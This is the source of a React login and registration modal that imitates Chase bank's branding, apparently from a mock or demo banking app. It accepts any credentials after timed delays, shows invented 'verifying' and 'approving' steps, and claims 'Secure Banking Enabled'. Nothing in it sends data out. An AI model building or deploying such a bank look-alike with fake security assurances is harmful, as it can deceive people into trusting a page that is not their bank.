
import React, { useState } from 'react';
import { AlertCircle, CheckCircle, Loader2, ShieldCheck } from 'lucide-react';
import ChaseLogo from './ChaseLogo';

interface AuthModalProps {
  onLogin: (name?: string) => void;
}

const AuthModal: React.FC<AuthModalProps> = ({ onLogin }) => {
  const [isLogin, setIsLogin] = useState(true);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [fullName, setFullName] = useState('');
  const [username, setUsername] = useState('');
  const [phone, setPhone] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [registrationStatus, setRegistrationStatus] = useState<'idle' | 'verifying' | 'approving' | 'approved'>('idle');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError('');
    
    if (password.length < 8) {
      setError('Password must be at least 8 characters long.');
      return;
    }

    setIsLoading(true);

    if (isLogin) {
      setTimeout(() => {
        setIsLoading(false);
        onLogin(); 
      }, 1500);
    } else {
      setRegistrationStatus('verifying');
      setTimeout(() => {
        setRegistrationStatus('approving');
        setTimeout(() => {
          setRegistrationStatus('approved');
          setIsLoading(false);
          setTimeout(() => onLogin(fullName), 1500);
        }, 1500);
      }, 1500);
    }
  };

  if (registrationStatus === 'approved') {
    return (
      <div className="bg-white rounded-lg shadow-xl w-full p-8 text-center border border-gray-200 animate-fade-in">
        <div className="h-20 w-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
          <CheckCircle className="h-10 w-10 text-green-600" />
        </div>
        <h2 className="text-2xl font-bold text-gray-900 mb-2">Account Approved!</h2>
        <p className="text-gray-600 mb-6">Welcome to Chase, <span className="font-semibold">{fullName}</span>.</p>
        <div className="flex items-center justify-center gap-2 text-sm text-[#117aca]">
          <Loader2 className="h-4 w-4 animate-spin" />
          Logging you in securely...
        </div>
      </div>
    );
  }

  return (
    <div className="bg-white rounded shadow-xl w-full overflow-hidden border-t-8 border-[#117aca] animate-fade-in">
      <div className="px-8 pt-8 pb-4 text-center">
        <div className="flex justify-center mb-4"><ChaseLogo className="h-12 w-12 text-[#117aca]" /></div>
        <h2 className="text-2xl font-bold text-gray-900 mb-6">{isLogin ? 'Welcome' : 'Open an Account'}</h2>
        <form onSubmit={handleSubmit} className="space-y-4">
          {!isLogin && (
            <div className="space-y-4">
              <input type="text" value={fullName} onChange={(e) => setFullName(e.target.value)} className="w-full px-3 py-2 border rounded text-black" placeholder="Full Name" required />
              <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} className="w-full px-3 py-2 border rounded text-black" placeholder="Email Address" required />
              <input type="tel" value={phone} onChange={(e) => setPhone(e.target.value)} className="w-full px-3 py-2 border rounded text-black" placeholder="Phone Number" required />
            </div>
          )}
          <input type="text" value={username} onChange={(e) => setUsername(e.target.value)} className="w-full px-3 py-2.5 border rounded text-black" placeholder="Username" required />
          <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} className="w-full px-3 py-2.5 border rounded text-black" placeholder="Password" required />
          
          {error && <div className="p-3 bg-red-50 text-red-700 text-sm rounded flex items-center gap-2"><AlertCircle className="h-4 w-4" />{error}</div>}
          
          <button type="submit" disabled={isLoading} className="w-full bg-[#117aca] hover:bg-[#0f6ab0] text-white font-bold py-2.5 rounded transition-all flex items-center justify-center gap-2">
            {isLoading ? <Loader2 className="h-4 w-4 animate-spin" /> : isLogin ? 'Sign In' : 'Create Account'}
          </button>
          
          <div className="pt-4 border-t border-gray-100">
            <button type="button" onClick={() => { setError(''); setIsLogin(!isLogin); }} className="text-sm text-[#117aca] hover:underline">
              {isLogin ? 'Not enrolled? Sign up now.' : 'Already have an account? Log in'}
            </button>
          </div>
        </form>
      </div>
      <div className="bg-gray-50 p-4 border-t border-gray-200 text-center">
        <div className="flex items-center justify-center gap-2 text-xs text-gray-500">
          <ShieldCheck className="h-4 w-4 text-green-600" />
          <span>Secure Banking Enabled</span>
        </div>
      </div>
    </div>
  );
};

export default AuthModal;
